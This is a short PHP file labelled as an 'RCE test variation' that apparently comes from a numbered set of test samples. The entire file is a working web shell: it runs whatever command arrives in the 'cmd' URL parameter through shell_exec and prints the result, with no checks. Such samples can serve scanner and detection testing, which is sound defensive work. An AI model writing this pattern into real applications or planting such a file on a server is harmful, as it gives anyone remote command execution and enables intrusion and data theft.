<?php
// RCE test variation #1116
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>